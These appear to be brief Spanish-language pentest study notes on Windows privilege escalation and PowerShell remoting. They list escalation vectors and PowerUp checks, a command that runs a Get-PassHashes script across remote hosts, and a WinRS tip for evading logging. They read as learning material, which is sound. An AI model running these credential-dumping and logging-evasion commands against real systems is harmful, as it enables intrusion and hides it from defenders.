# Priv. Esc. Local

Hay muchas maneras de escalar priv en Windows:

-Falta de parches

-Despliegues automatizados, Autologs passwords, contraseñas en texto claro

-AlwaysInstallElevated (cualquier usuario puede correrlo en MSI como SYSTEM)

-Servicios mal configurados `(<servicio> sdshow alg)`

-DLL Hijacking

Podemos usar varias utilidades: (GitHub)

-PowerUp

-BeRoot

-Privesc

Priv. Esc. PowerUp:

`Get-ServiceUnquoted -Verbose` , `Get-ModifiableServiceFile -Verbose` , `Get-ModifiableService -Verbose` , `Invoke-AllChecks`

PowerShell Remoting:

psexec → silent and super fast

use WinRM → Windows Remote Management, enabled by default on Server 2012, ports 5985(HTTP) and 5986(HTTPS)

Need enable (Enable-PSRemoting), (admin pric need).

Get elevated shell

Comands:

ejecutar comandos o scripblocks:

`Invoke-Command –Scriptblock {Get-Process} -ComputerName (Get-Content )`

ejecutar scripts de archivos:

`Invoke-Command –FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content )`

ejecutar funciones locales cargados en una maquina:

`Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content )`

TradeCraft:

-Se puede usar WinRS para evadir loggins:

`winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname`